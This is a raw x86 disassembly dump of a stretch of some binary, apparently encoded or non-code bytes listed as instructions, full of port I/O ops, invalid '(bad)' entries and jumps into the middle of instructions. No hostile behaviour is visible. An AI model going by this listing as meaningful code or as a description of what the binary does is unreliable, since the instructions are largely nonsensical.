  420d42:	bound  esi,QWORD PTR [edx-0x1418898f]
  420d48:	jmp    0x420d69
  420d4a:	mov    dl,0x71
  420d4c:	ja     0x420d35
  420d4e:	jmp    0x420d3b
  420d50:	push   ds
  420d51:	mov    dl,0x71
  420d53:	js     0x420d3c
  420d55:	jmp    0x420d42
  420d57:	sbb    dh,BYTE PTR [edx-0x1418868f]
  420d5d:	jmp    0x420daf
  420d5f:	mov    dl,0x71
  420d61:	jp     0x420d4a
  420d63:	jmp    0x420d50
  420d65:	pop    eax
  420d66:	mov    dl,0x71
  420d68:	jnp    0x420d51
  420d6a:	jmp    0x420d57
  420d6c:	pop    eax
  420d6d:	mov    dl,0x71
  420d6f:	jl     0x420d58
  420d71:	jmp    0x420d5e
  420d73:	in     al,dx
  420d74:	mov    dl,0x71
  420d76:	sbb    al,0xe7
  420d78:	jmp    0x420d65
  420d7a:	das    
  420d7b:	mov    dl,0x71
  420d7d:	sbb    eax,0x58ebebe7
  420d82:	mov    dl,0x71
  420d84:	push   ds
  420d85:	out    0xeb,eax
  420d87:	jmp    0x420de4
  420d89:	mov    dl,0x71
  420d8b:	pop    ds
  420d8c:	out    0xeb,eax
  420d8e:	jmp    0x420def
  420d90:	mov    dl,0x71
  420d92:	and    bh,ah
  420d94:	jmp    0x420d81
  420d96:	push   ecx
  420d97:	mov    dl,0x71
  420d99:	and    edi,esp
  420d9b:	jmp    0x420d88
  420d9d:	xor    al,0xb2
  420d9f:	jno    0x420dc3
  420da1:	out    0xeb,eax
  420da3:	jmp    0x420df2
  420da5:	mov    dl,0x71
  420da7:	and    esp,edi
  420da9:	jmp    0x420d96
  420dab:	pop    edx
  420dac:	mov    dl,0x71
  420dae:	and    al,0xe7
  420db0:	jmp    0x420d9d
  420db2:	push   eax
  420db3:	mov    dl,0x71
  420db5:	and    eax,0x58ebebe7
  420dba:	mov    dl,0x71
  420dbc:	es out 0xeb,eax
  420dbf:	jmp    0x420e12
  420dc1:	mov    dl,0x71
  420dc3:	daa    
  420dc4:	out    0xeb,eax
  420dc6:	jmp    0x420db4
  420dc8:	mov    dl,0x71
  420dca:	and    bh,0xeb
  420dcd:	jmp    0x420dfe
  420dcf:	mov    dl,0x71
  420dd1:	and    edi,0xb25eebeb
  420dd7:	jno    0x420d5b
  420dd9:	out    0xeb,eax
  420ddb:	jmp    0x420e2e
  420ddd:	mov    dl,0x71
  420ddf:	and    edi,0xffffffeb
  420de2:	jmp    0x420e31
  420de4:	mov    dl,0x71
  420de6:	test   bh,ah
  420de8:	jmp    0x420dd5
  420dea:	pusha  
  420deb:	mov    dl,0x71
  420ded:	test   edi,esp
  420def:	jmp    0x420ddc
  420df1:	push   ecx
  420df2:	mov    dl,0x71
  420df4:	xchg   bh,ah
  420df6:	jmp    0x420de3
  420df8:	xor    dh,BYTE PTR [edx-0x1418788f]
  420dfe:	jmp    0x420e55
  420e00:	mov    dl,0x71
  420e02:	mov    bh,ah
  420e04:	jmp    0x420df1
  420e06:	pop    eax
  420e07:	mov    dl,0x71
  420e09:	mov    edi,esp
  420e0b:	jmp    0x420df8
  420e0d:	push   ecx
  420e0e:	mov    dl,0x71
  420e10:	mov    ah,bh
  420e12:	jmp    0x420dff
  420e14:	sub    eax,0xe78b71b2
  420e19:	jmp    0x420e06
  420e1b:	in     al,dx
  420e1c:	mov    dl,0x31
  420e1e:	ins    BYTE PTR es:[edi],dx
  420e1f:	ds mov dl,0x31
  420e22:	ins    DWORD PTR es:[edi],dx
  420e23:	push   ecx
  420e24:	mov    dl,0x31
  420e26:	outs   dx,BYTE PTR ds:[esi]
  420e27:	dec    ebp
  420e28:	mov    dl,0x31
  420e2a:	outs   dx,DWORD PTR ds:[esi]
  420e2b:	push   eax
  420e2c:	mov    dl,0x31
  420e2e:	jo     0x420e62
  420e30:	mov    dl,0x31
  420e32:	jno    0x420e89
  420e34:	mov    dl,0x31
  420e36:	jb     0x420e90
  420e38:	mov    dl,0x31
  420e3a:	jae    0x420e8d
  420e3c:	mov    dl,0x31
  420e3e:	je     0x420e2c
  420e40:	mov    dl,0x71
  420e42:	add    al,0xe7
  420e44:	jmp    0x420e31
  420e46:	cmp    esi,DWORD PTR [edx-0x1418fa8f]
  420e4c:	jmp    0x420e80
  420e4e:	mov    dl,0x71
  420e50:	push   es
  420e51:	out    0xeb,eax
  420e53:	jmp    0x420e87
  420e55:	mov    dl,0x71
  420e57:	pop    es
  420e58:	out    0xeb,eax
  420e5a:	jmp    0x420e9b
  420e5c:	mov    dl,0x71
  420e5e:	or     bh,ah
  420e60:	jmp    0x420e4d
  420e62:	xor    DWORD PTR [edx-0x1418f68f],esi
  420e68:	jmp    0x420eaa
  420e6a:	mov    dl,0x71
  420e6c:	or     ah,bh
  420e6e:	jmp    0x420e5b
  420e70:	aas    
  420e71:	mov    dl,0x71
  420e73:	or     esp,edi
  420e75:	jmp    0x420e62
  420e77:	sbb    BYTE PTR [edx-0x1418f38f],dh
  420e7d:	jmp    0x420eba
  420e7f:	mov    dl,0x71
  420e81:	or     eax,0x3aebebe7
  420e86:	mov    dl,0x71
  420e88:	push   cs
  420e89:	out    0xeb,eax
  420e8b:	jmp    0x420ebc
  420e8d:	mov    dl,0x71
  420e8f:	movntq (bad),mm5
  420e90:	out    0xeb,eax
  420e92:	jmp    0x420ec5
  420e94:	mov    dl,0x71
  420e96:	adc    bh,ah
  420e98:	jmp    0x420e85
  420e9a:	in     al,dx
  420e9b:	push   edx
  420e9c:	mov    bl,0x71
  420e9e:	mov    edi,fs
  420ea0:	jmp    0x420e8d
  420ea2:	inc    eax
  420ea3:	in     al,dx
  420ea4:	push   edx
  420ea5:	mov    bl,0x71
  420ea7:	mov    fs,edi
  420ea9:	jmp    0x420e96
  420eab:	ds in  al,dx
  420ead:	push   edx
  420eae:	mov    bl,0x71
  420eb0:	nop
  420eb1:	out    0xeb,eax
  420eb3:	jmp    0x420ee2
  420eb5:	in     al,dx
  420eb6:	push   edx
  420eb7:	mov    bl,0x71
  420eb9:	xchg   edx,eax
  420eba:	out    0xeb,eax
  420ebc:	jmp    0x420ef8
  420ebe:	in     al,dx
  420ebf:	push   edx
  420ec0:	mov    bl,0x71
  420ec2:	xchg   esp,eax
  420ec3:	out    0xeb,eax
  420ec5:	jmp    0x420f06
  420ec7:	in     al,dx
  420ec8:	push   edx
  420ec9:	mov    bl,0x71
  420ecb:	xchg   esi,eax
  420ecc:	out    0xeb,eax
  420ece:	jmp    0x420efd
  420ed0:	in     al,dx
  420ed1:	push   edx
  420ed2:	mov    bl,0x71
  420ed4:	cwde   
  420ed5:	out    0xeb,eax
  420ed7:	jmp    0x420f08
  420ed9:	in     al,dx
  420eda:	push   edx
  420edb:	mov    bl,0x71
  420edd:	call   0x52ec:0x40ebebe7
  420ee4:	mov    bl,0x71
  420ee6:	pushf  
  420ee7:	out    0xeb,eax
  420ee9:	jmp    0x420f20
  420eeb:	in     al,dx
  420eec:	push   edx
  420eed:	mov    bl,0x71
  420eef:	sahf   
  420ef0:	out    0xeb,eax
  420ef2:	jmp    0x420f2f
  420ef4:	in     al,dx
  420ef5:	push   edx
  420ef6:	mov    bl,0x71
  420ef8:	mov    al,ds:0x3aebebe7
  420efd:	in     al,dx
  420efe:	push   edx
  420eff:	mov    bl,0x71
  420f01:	mov    ds:0xecebebe7,al
  420f06:	in     al,dx
  420f07:	mov    bl,0x71
  420f09:	adc    al,0xe7
  420f0b:	jmp    0x420ef8
  420f0d:	in     al,dx
  420f0e:	in     al,dx
  420f0f:	in     al,dx
  420f10:	in     al,dx
  420f11:	mov    dl,0x71
  420f13:	test   al,0xe7
  420f15:	jmp    0x420f02
  420f17:	pop    eax
  420f18:	mov    dl,0x71
  420f1a:	test   eax,0x5febebe7
  420f1f:	mov    dl,0x71
  420f21:	stos   BYTE PTR es:[edi],al
  420f22:	out    0xeb,eax
  420f24:	jmp    0x420f86
  420f26:	mov    dl,0x71
  420f28:	stos   DWORD PTR es:[edi],eax
  420f29:	out    0xeb,eax
  420f2b:	jmp    0x420f8b
  420f2d:	mov    dl,0x71
  420f2f:	lods   al,BYTE PTR ds:[esi]
  420f30:	out    0xeb,eax
  420f32:	jmp    0x420f83
  420f34:	mov    dl,0x71
  420f36:	lods   eax,DWORD PTR ds:[esi]
  420f37:	out    0xeb,eax
  420f39:	jmp    0x420f88
  420f3b:	mov    dl,0x71
  420f3d:	scas   al,BYTE PTR es:[edi]
  420f3e:	out    0xeb,eax
  420f40:	jmp    0x420fa2
  420f42:	mov    dl,0x71
  420f44:	scas   eax,DWORD PTR es:[edi]
  420f45:	out    0xeb,eax
  420f47:	jmp    0x420f76
  420f49:	mov    dl,0x71
  420f4b:	mov    al,0xe7
  420f4d:	jmp    0x420f3a
  420f4f:	in     al,dx
  420f50:	mov    dl,0x71
  420f52:	cmp    bh,ah
  420f54:	jmp    0x420f41
  420f56:	xor    esi,DWORD PTR [edx-0x1418c68f]
  420f5c:	jmp    0x420faf
  420f5e:	mov    dl,0x71
  420f60:	cmp    ah,bh
  420f62:	jmp    0x420f4f
  420f64:	pusha  
  420f65:	mov    dl,0x71
  420f67:	cmp    esp,edi
  420f69:	jmp    0x420f56
  420f6b:	xor    dh,BYTE PTR [edx-0x1418c38f]
  420f71:	jmp    0x420fc8
  420f73:	mov    dl,0x71
  420f75:	cmp    eax,0x58ebebe7
  420f7a:	mov    dl,0x71
  420f7c:	ds out 0xeb,eax
  420f7f:	jmp    0x420fd2
  420f81:	mov    dl,0x71
  420f83:	aas    
  420f84:	out    0xeb,eax
  420f86:	jmp    0x420fc7
  420f88:	mov    dl,0x71
  420f8a:	inc    eax
  420f8b:	out    0xeb,eax
  420f8d:	jmp    0x420fe4
  420f8f:	mov    dl,0x71
  420f91:	inc    ecx
  420f92:	out    0xeb,eax
  420f94:	jmp    0x420ffc
  420f96:	mov    dl,0x71
  420f98:	inc    edx
  420f99:	out    0xeb,eax
  420f9b:	jmp    0x420fee
  420f9d:	mov    dl,0x71
  420f9f:	inc    ebx
  420fa0:	out    0xeb,eax
  420fa2:	jmp    0x420f90
  420fa4:	mov    dl,0x71
  420fa6:	sub    bl,ch
  420fa8:	jmp    0x420f95
  420faa:	xor    esi,DWORD PTR [edx-0x1414d68f]
  420fb0:	jmp    0x421003
  420fb2:	mov    dl,0x71
  420fb4:	sub    ch,bl
  420fb6:	jmp    0x420fa3
  420fb8:	pusha  
  420fb9:	mov    dl,0x71
  420fbb:	sub    ebp,ebx
  420fbd:	jmp    0x420faa
  420fbf:	aas    
  420fc0:	mov    dl,0x71
  420fc2:	sub    al,0xeb
  420fc4:	jmp    0x420fb1
  420fc6:	gs mov dl,0x71
  420fc9:	sub    eax,0x5febebeb
  420fce:	mov    dl,0x71
  420fd0:	cs jmp 0x420fbe
  420fd3:	jmp    0x421035
  420fd5:	mov    dl,0x71
  420fd7:	das    
  420fd8:	jmp    0x420fc5
  420fda:	jmp    0x42102d
  420fdc:	mov    dl,0x71
  420fde:	xor    bl,ch
  420fe0:	jmp    0x420fcd
  420fe2:	pop    ecx
  420fe3:	mov    dl,0x71
  420fe5:	xor    ebx,ebp
  420fe7:	jmp    0x420fd4
  420fe9:	xor    BYTE PTR [edx-0x1414cd8f],dh
  420fef:	jmp    0x421046
  420ff1:	mov    dl,0x71
  420ff3:	xor    ebp,ebx
  420ff5:	jmp    0x420fe2
  420ff7:	pop    esi
  420ff8:	mov    dl,0x71
  420ffa:	xor    al,0xeb
  420ffc:	jmp    0x420fe9
  420ffe:	push   ecx
  420fff:	mov    dl,0x71
  421001:	xor    eax,0x4febebeb
  421006:	mov    dl,0x71
  421008:	ss jmp 0x420ff6
  42100b:	jmp    0x42106d
  42100d:	mov    dl,0x71
  42100f:	aaa    
  421010:	jmp    0x420ffd
  421012:	jmp    0x42106f
  421014:	mov    dl,0x71
  421016:	cmp    bl,ch
  421018:	jmp    0x421005
  42101a:	pop    esi
  42101b:	mov    dl,0x71
  42101d:	cmp    ebx,ebp
  42101f:	jmp    0x42100c
  421021:	gs mov dl,0x71
  421024:	cmp    ch,bl
  421026:	jmp    0x421013
  421028:	sub    eax,0xeb3b71b2
  42102d:	jmp    0x42101a
  42102f:	in     al,dx
  421030:	mov    bl,0x71
  421032:	mov    ah,0xe7
  421034:	jmp    0x421021
  421036:	in     al,dx
  421037:	in     al,dx
  421038:	in     al,dx
  421039:	in     al,dx
  42103a:	mov    bl,0x31
  42103c:	loopne 0x42102a
  42103e:	in     al,dx
  42103f:	in     al,dx
  421040:	in     al,dx
  421041:	jns    0x421084
  421043:	ins    BYTE PTR es:[edi],dx
  421044:	ds ja  0x4210b8
  421047:	inc    eax
  421048:	jmp    0x421035
  42104a:	jmp    0x421088
  42104c:	jmp    0x420fcf
  42104e:	inc    esp
  42104f:	out    0xeb,eax
  421051:	jmp    0x4210c8
  421053:	jno    0x421069
  421055:	out    0xeb,eax
  421057:	jmp    0x4210d2
  421059:	jns    0x421077
  42105b:	out    0xeb,eax
  42105d:	jmp    0x42109c
  42105f:	ja     0x420fe2
  421061:	inc    eax
  421062:	jmp    0x42104f
  421064:	jmp    0x4210a4
  421066:	jmp    0x420fe9
  421068:	inc    esp
  421069:	out    0xeb,eax
  42106b:	jmp    0x4210e2
  42106d:	jno    0x421013
  42106f:	out    0xeb,eax
  421071:	jmp    0x421025
  421073:	jno    0x4210f1
  421075:	out    0xeb,al
  421077:	jmp    0x4210b8
  421079:	mov    dl,0x71
  42107b:	jge    0x421063
  42107d:	jmp    0x42106a
  42107f:	pop    eax
  421080:	mov    dl,0x71
  421082:	jle    0x42106a
  421084:	jmp    0x421071
  421086:	push   ecx
  421087:	mov    dl,0x71
  421089:	jg     0x421071
  42108b:	jmp    0x421078
  42108d:	push   ecx
  42108e:	mov    dl,0x71
  421090:	and    dh,0xeb
  421093:	jmp    0x4210f1
  421095:	mov    dl,0x71
  421097:	and    esi,0x79ecebeb
  42109d:	jno    0x42111b
  42109f:	out    0xeb,al
  4210a1:	jmp    0x4210df
  4210a3:	ja     0x42111e
  4210a5:	inc    eax
  4210a6:	jmp    0x421093
  4210a8:	jmp    0x4210e7
  4210aa:	jmp    0x42102d
  4210ac:	inc    esp
  4210ad:	out    0xeb,eax
  4210af:	jmp    0x421126
  4210b1:	xor    esp,esp
  4210b3:	jns    0x421036
  4210b5:	sub    bl,ch
  4210b7:	jmp    0x4210a4
  4210b9:	ds ja  0x42112d
  4210bc:	inc    eax
  4210bd:	jmp    0x4210aa
  4210bf:	jmp    0x4210fd
  4210c1:	jmp    0x421044
  4210c3:	inc    esp
  4210c4:	out    0xeb,eax
  4210c6:	jmp    0x42113d
  4210c8:	jno    0x421142
  4210ca:	call   0xec98fcba
  4210cf:	push   esi
  4210d0:	in     al,dx
  4210d1:	push   esi
  4210d2:	in     al,dx
  4210d3:	jmp    0x421056
  4210d5:	dec    eax
  4210d6:	out    0xeb,eax
  4210d8:	jmp    0x421130
  4210da:	in     al,dx
  4210db:	jmp    0x42105e
  4210dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210de:	out    0xeb,eax
  4210e0:	jmp    0x42115b
  4210e2:	jns    0x42108c
  4210e4:	out    0xeb,eax
  4210e6:	jmp    0x421125
  4210e8:	ja     0x42106b
  4210ea:	inc    eax
  4210eb:	jmp    0x4210d8
  4210ed:	jmp    0x42112d
  4210ef:	jmp    0x421072
  4210f1:	inc    esp
  4210f2:	out    0xeb,eax
  4210f4:	jmp    0x42116b
  4210f6:	jno    0x42116c
  4210f8:	call   0x71bbfce8
  4210fd:	and    bh,0xeb
  421100:	jmp    0x42113e
  421102:	ja     0x42117d
  421104:	inc    eax
  421105:	jmp    0x4210f2
  421107:	jmp    0x421146
  421109:	jmp    0x42108c
  42110b:	inc    esp
  42110c:	out    0xeb,eax
  42110e:	jmp    0x421185
  421110:	jno    0x421126
  421112:	jmp    0x4210ff
  421114:	jmp    0x42116a
  421116:	and    ch,ch
  421118:	in     al,dx
  421119:	in     al,dx
  42111a:	jns    0x42109d
  42111c:	fsub   st(0),st
  42111e:	jmp    0x42110b
  421120:	ds jmp 0x4210a4
  421123:	js     0x42110d
  421125:	jmp    0x421112
  421127:	jns    0x42119a
  421129:	cmp    bh,ah
  42112b:	jmp    0x421118
  42112d:	cmp    al,0x77
  42112f:	jns    0x421171
  421131:	jmp    0x42111e
  421133:	jmp    0x421172
  421135:	jmp    0x4210b8
  421137:	inc    esp
  421138:	out    0xeb,eax
  42113a:	jmp    0x4211b1
  42113c:	jno    0x421166
  42113e:	out    0xeb,eax
  421140:	jmp    0x4210f4
  421142:	jno    0x421120
  421144:	call   0xb42efd34
  421149:	jno    0x42117f
  42114b:	out    0xeb,eax
  42114d:	jmp    0x421153
  42114f:	in     al,dx
  421150:	in     al,dx
  421151:	in     al,dx
  421152:	push   esp
  421153:	sbb    eax,0x79ececee
  421158:	sbb    esp,0x3eebebe8
  42115e:	jmp    0x4210e1
  421160:	js     0x42114a
  421162:	jmp    0x42114f
  421164:	outs   dx,DWORD PTR ds:[esi]
  421165:	in     al,0xf6
  421167:	sti    
  421168:	jb     0x4211e5
  42116a:	in     al,dx
  42116b:	in     al,dx
  42116c:	in     al,dx
  42116d:	jns    0x4211e0
  42116f:	jo     0x421158
  421171:	jmp    0x42115e
  421173:	jne    0x4211e6
  421175:	enter  0xebe8,0xeb
  421179:	push   esi
  42117a:	in     al,dx
  42117b:	jns    0x4211f6
  42117d:	fsub   st(0),st
  42117f:	jmp    0x42116c
  421181:	cmp    eax,0xe87481eb
  421186:	jmp    0x421173
  421188:	outs   dx,DWORD PTR ds:[esi]
  421189:	mov    al,0xf4
  42118b:	jns    0x42110e
  42118d:	fsub   st(0),st
  42118f:	jmp    0x42117c
  421191:	jne    0x421114
  421193:	mov    ah,0xe7
  421195:	jmp    0x421182
  421197:	push   esi
  421198:	jmp    0x421185
  42119a:	and    DWORD PTR [edi+eiz*8+0x7179ebeb],0xebebe870
  4211a5:	cmp    al,0x79
  4211a7:	jns    0x421185
  4211a9:	call   0xeb7ffd99
  4211ae:	xor    DWORD PTR [eax+ebp*8-0x15],0xf4b06feb
  4211b6:	ja     0x421139
  4211b8:	enter  0xebe8,0xeb
  4211bc:	ds jns 0x421230
  4211bf:	fsub   st(0),st
  4211c1:	jmp    0x4211ae
  4211c3:	cmp    al,0xeb
  4211c5:	xor    DWORD PTR [eax+ebp*8-0x15],0xf4b06feb
  4211cd:	push   esi
  4211ce:	in     al,dx
  4211cf:	jmp    0x421152
  4211d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211d2:	out    0xeb,eax
  4211d4:	jmp    0x42122a
  4211d6:	xchg   esi,eax
  4211d7:	in     al,dx
  4211d8:	in     al,dx
  4211d9:	in     al,dx
  4211da:	jmp    0x42121d
  4211dc:	in     al,0x56
  4211de:	in     al,dx
  4211df:	push   esi
  4211e0:	in     al,dx
  4211e1:	push   esi
  4211e2:	out    dx,eax
  4211e3:	push   esi
  4211e4:	in     al,dx
  4211e5:	push   esi
  4211e6:	out    dx,eax
  4211e7:	push   esi
  4211e8:	in     eax,dx
  4211e9:	ja     0x421264
  4211eb:	mov    ah,0xe7
  4211ed:	jmp    0x4211da
  4211ef:	cmp    eax,0xeb1481eb
  4211f4:	jmp    0x4211e1
  4211f6:	jne    0x421269
  4211f8:	enter  0xebe8,0xeb
  4211fc:	mov    bl,0x31
  4211fe:	js     0x4211ec
  421200:	in     al,dx
  421201:	in     al,dx
  421202:	in     al,dx
  421203:	mov    bl,0x31
  421205:	jl     0x4211f3
  421207:	in     al,dx
  421208:	in     al,dx
  421209:	in     al,dx
  42120a:	outs   dx,DWORD PTR ds:[esi]
  42120b:	test   eax,0xebebe8c8
  421210:	jmp    0x42120d
  421212:	jo     0x4211c5
  421214:	in     eax,dx
  421215:	in     al,dx
  421216:	in     al,dx
  421217:	mov    bl,0x31
  421219:	loopne 0x421209
  42121b:	lock repnz in al,dx
  42121e:	mov    bl,0x71
  421220:	sub    al,0xe7
  421222:	jmp    0x42120f
  421224:	stc    
  421225:	in     al,dx
  421226:	in     al,dx
  421227:	in     al,dx
  421228:	push   esi
  421229:	lock push esp
  42122b:	in     al,dx
  42122c:	cld    
  42122d:	in     al,dx
  42122e:	in     al,dx
  42122f:	ja     0x421272
  421231:	loopne 0x4212a0
  421233:	scas   al,BYTE PTR es:[edi]
  421234:	sti    
  421235:	es in  al,dx
  421237:	in     al,dx
  421238:	ds push esi
  42123a:	in     al,dx
  42123b:	jmp    0x4211be
  42123d:	pusha  
  42123e:	call   0x31b7fe2e
  421243:	jl     0x4212bc
  421245:	xor    DWORD PTR [ebp+esi*2+0x31],edi
  421249:	mov    WORD PTR [ebx-0x14198b8f],?
  42124f:	jmp    0x42123d
  421251:	in     al,dx
  421252:	in     al,dx
  421253:	in     al,dx
  421254:	outs   dx,DWORD PTR ds:[esi]
  421255:	imul   ecx,DWORD PTR [esp+ebp*8-0x12958f05],0x7979ecec
  421260:	je     0x421248
  421262:	jmp    0x42124f
  421264:	jne    0x4212df
  421266:	jo     0x42124e
  421268:	jmp    0x421255
  42126a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42126b:	in     al,dx
  42126c:	in     al,dx
  42126d:	in     al,dx
  42126e:	in     al,dx
  42126f:	cmp    al,0xeb
  421271:	mov    eax,ds:0xebebe670
  421276:	push   esi
  421277:	(bad)  
  421278:	jmp    0x4212bb
  42127a:	in     al,0xeb
  42127c:	popa   
  42127d:	loopne 0x42126a
  42127f:	popa   
  421280:	mov    ebx,gs
  421282:	mov    eax,ds:0xebebe8c8
  421287:	jmp    0x42120a
  421289:	and    al,0xeb
  42128b:	jmp    0x421278
  42128d:	jmp    0x421210
  42128f:	adc    al,0xe7
  421291:	jmp    0x42127e
  421293:	mov    bl,0x71
  421295:	ins    BYTE PTR es:[edi],dx
  421296:	out    0xeb,al
  421298:	jmp    0x421286
  42129a:	in     al,dx
  42129b:	in     al,dx
  42129c:	in     al,dx
  42129d:	xlat   BYTE PTR ds:[ebx]
  42129e:	sti    
  42129f:	ja     0x421222
  4212a1:	ins    BYTE PTR es:[edi],dx
  4212a2:	out    0xeb,al
  4212a4:	jmp    0x421315
  4212a6:	scas   al,BYTE PTR es:[edi]
  4212a7:	in     eax,dx
  4212a8:	jne    0x42122b
  4212aa:	ins    BYTE PTR es:[edi],dx
  4212ab:	out    0xeb,al
  4212ad:	jmp    0x42131c
  4212af:	test   eax,0xebebe66c
  4212b4:	add    BYTE PTR [edx],bh
  4212b6:	icebp  
  4212b7:	in     al,dx
  4212b8:	pop    edi
  4212b9:	imul   ebp,DWORD PTR [edi-0x57],0x6c
  4212bd:	out    0xeb,eax
  4212bf:	jmp    0x4212ad
  4212c1:	popa   
  4212c2:	bound  esi,QWORD PTR [ebx-0x1419978f]
  4212c8:	jmp    0x4212b6
  4212ca:	in     al,dx
  4212cb:	in     al,dx
  4212cc:	in     al,dx
  4212cd:	xlat   BYTE PTR ds:[ebx]
  4212ce:	sti    
  4212cf:	ja     0x421342
  4212d1:	push   0x6febebe6
  4212d6:	lods   al,BYTE PTR ds:[esi]
  4212d7:	in     eax,dx
  4212d8:	jne    0x42134b
  4212da:	push   0x77ebebe6
  4212df:	jns    0x421315
  4212e1:	out    0xeb,eax
  4212e3:	jmp    0x421354
  4212e5:	aad    0xed
  4212e7:	and    eax,0xebe66879
  4212ec:	jmp    0x42134d
  4212ee:	xor    DWORD PTR [edi-0x7f],esi
  4212f1:	push   0xfbebebe6
  4212f6:	mov    ds:0xe78c0170,al
  4212fb:	jmp    0x4212e8
  4212fd:	ja     0x421378
  4212ff:	ins    BYTE PTR es:[edi],dx
  421300:	out    0xeb,al
  421302:	jmp    0x4212f3
  421304:	jns    0x42136e
  421306:	out    0xeb,al
  421308:	jmp    0x421381
  42130a:	inc    ecx
  42130b:	mov    ebx,?
  42130d:	mov    ds:0xad27f6f8,al
  421312:	popa   
  421313:	or     al,0x77
  421315:	sub    DWORD PTR [eax-0x1a],0xd6bdebeb
  42131c:	sti    
  42131d:	mov    ds:0xe78e4170,eax
  421322:	jmp    0x42130f
  421324:	jno    0x4212d2
  421326:	popa   
  421327:	div    BYTE PTR [ebx-0x1418938f]
  42132d:	jmp    0x42131c
  42132f:	in     al,dx
  421330:	in     al,dx
  421331:	in     al,dx
  421332:	xlat   BYTE PTR ds:[ebx]
  421333:	xchg   ebp,edx
  421335:	push   edx
  421336:	jmp    0x421323
  421338:	jmp    0x4212ed
  42133a:	jno    0x4213a8
  42133c:	out    0xeb,al
  42133e:	jmp    0x42132c
  421340:	in     al,dx
  421341:	in     al,dx
  421342:	in     al,dx
  421343:	xlat   BYTE PTR ds:[ebx]
  421344:	sti    
  421345:	ja     0x4213c0
  421347:	ins    BYTE PTR es:[edi],dx
  421348:	out    0xeb,al
  42134a:	jmp    0x4213bb
  42134c:	lods   eax,DWORD PTR ds:[esi]
  42134d:	in     eax,dx
  42134e:	jne    0x4213c9
  421350:	ins    BYTE PTR es:[edi],dx
  421351:	out    0xeb,al
  421353:	jmp    0x4213c4
  421355:	test   eax,0xebebe8d4
  42135a:	in     al,dx
  42135b:	popa   
  42135c:	imul   esi,DWORD PTR [edi-0x7f],0x6c
  421360:	out    0xeb,al
  421362:	jmp    0x42138b
  421364:	inc    ecx
  421365:	loopne 0x4213c6
  421367:	pusha  
  421368:	mov    bl,0x71
  42136a:	fs out 0xeb,al
  42136d:	jmp    0x42135b
  42136f:	in     al,dx
  421370:	in     al,dx
  421371:	in     al,dx
  421372:	xlat   BYTE PTR ds:[ebx]
  421373:	sti    
  421374:	ja     0x4213e7
  421376:	fs out 0xeb,al
  421379:	jmp    0x4213ea
  42137b:	lods   al,BYTE PTR ds:[esi]
  42137c:	in     eax,dx
  42137d:	jne    0x4213f0
  42137f:	fs out 0xeb,al
  421382:	jmp    0x4213fb
  421384:	jns    0x4213b2
  421386:	out    0xeb,eax
  421388:	jmp    0x4213f9
  42138a:	aad    0xed
  42138c:	and    eax,0xebe66479
  421391:	jmp    0x4213f2
  421393:	das    
  421394:	ja     0x421317
  421396:	fs out 0xeb,al
  421399:	jmp    0x421396
  42139b:	mov    ds:0xe7040170,al
  4213a0:	jmp    0x42138d
  4213a2:	ja     0x42141d
  4213a4:	ins    BYTE PTR es:[edi],dx
  4213a5:	out    0xeb,al
  4213a7:	jmp    0x421398
  4213a9:	jns    0x42140f
  4213ab:	out    0xeb,al
  4213ad:	jmp    0x421426
  4213af:	inc    ecx
  4213b0:	mov    ebx,?
  4213b2:	mov    ds:0xad27f6f8,al
  4213b7:	popa   
  4213b8:	or     dh,BYTE PTR [edi-0x7f]
  4213bb:	fs out 0xeb,al
  4213be:	jmp    0x4213bb
  4213c0:	stos   BYTE PTR es:[edi],al
  4213c1:	jo     0x4213c4
  4213c3:	add    eax,0x71ebebe7
  4213c8:	lods   al,BYTE PTR ds:[esi]
  4213c9:	popa   
  4213ca:	div    BYTE PTR [ebx-0x14172b8f]
  4213d0:	jmp    0x4213bf
  4213d2:	in     al,dx
  4213d3:	in     al,dx
  4213d4:	in     al,dx
  4213d5:	xlat   BYTE PTR ds:[ebx]
  4213d6:	mov    ebp,edx
  4213d8:	push   ebp
  4213d9:	jmp    0x4213c6
  4213db:	jmp    0x42144c
  4213dd:	test   eax,0xebebe8d4
  4213e2:	in     eax,dx
  4213e3:	popa   
  4213e4:	cmc    
  4213e5:	outs   dx,DWORD PTR ds:[esi]
  4213e6:	test   eax,0xebebe76c
  4213eb:	in     eax,dx
  4213ec:	pusha  
  4213ed:	sbb    ebp,ebx
  4213ef:	inc    ecx
  4213f0:	mov    WORD PTR [edi+0x79],?
  4213f3:	aam    0xe8
  4213f5:	jmp    0x4213e2
  4213f7:	mov    bl,0xed
  4213f9:	in     al,dx
  4213fa:	in     al,dx
  4213fb:	in     al,dx
  4213fc:	in     al,dx
  4213fd:	ja     0x421380
  4213ff:	js     0x4213e7
  421401:	jmp    0x4213ee
  421403:	mov    bl,0x70
  421405:	adc    esp,0xf6ebebe6
  42140b:	in     al,dx
  42140c:	in     al,dx
  42140d:	in     al,dx
  42140e:	mov    bl,0x71
  421410:	pusha  
  421411:	call   0xed2f0001
  421416:	in     al,dx
  421417:	in     al,dx
  421418:	aad    0x2f
  42141a:	out    dx,al
  42141b:	in     al,dx
  42141c:	in     al,dx
  42141d:	push   esi
  42141e:	imul   bl
  421420:	inc    ecx
  421421:	in     al,0x54
  421423:	in     al,dx
  421424:	ins    BYTE PTR es:[edi],dx
  421425:	in     al,dx
  421426:	in     al,dx
  421427:	push   esi
  421428:	in     al,dx
  421429:	ja     0x42145c
  42142b:	mov    WORD PTR [ebx+ebp*8],?
  42142e:	or     DWORD PTR [eax-0x19],0x71b3ebeb
  421435:	pop    esp
  421436:	out    0xeb,al
  421438:	jmp    0x421426
  42143a:	in     al,dx
  42143b:	in     al,dx
  42143c:	in     al,dx
  42143d:	xlat   BYTE PTR ds:[ebx]
  42143e:	sti    
  42143f:	ja     0x4214ba
  421441:	pop    esp
  421442:	out    0xeb,al
  421444:	jmp    0x4214b5
  421446:	lods   eax,DWORD PTR ds:[esi]
  421447:	in     eax,dx
  421448:	jne    0x4214c3
  42144a:	pop    esp
  42144b:	out    0xeb,al
  42144d:	jmp    0x4214be
  42144f:	test   eax,0xebebe65c
  421454:	neg    BYTE PTR [edi+0x24]
  421457:	ja     0x4213da
  421459:	pop    esp
  42145a:	out    0xeb,al
  42145c:	jmp    0x4214cd
  42145e:	test   al,0x81
  421460:	aam    0xe6
  421462:	jmp    0x42144f
  421464:	in     al,dx
  421465:	pusha  
  421466:	adc    al,0x77
  421468:	jno    0x4214c6
  42146a:	out    0xeb,al
  42146c:	jmp    0x4214e5
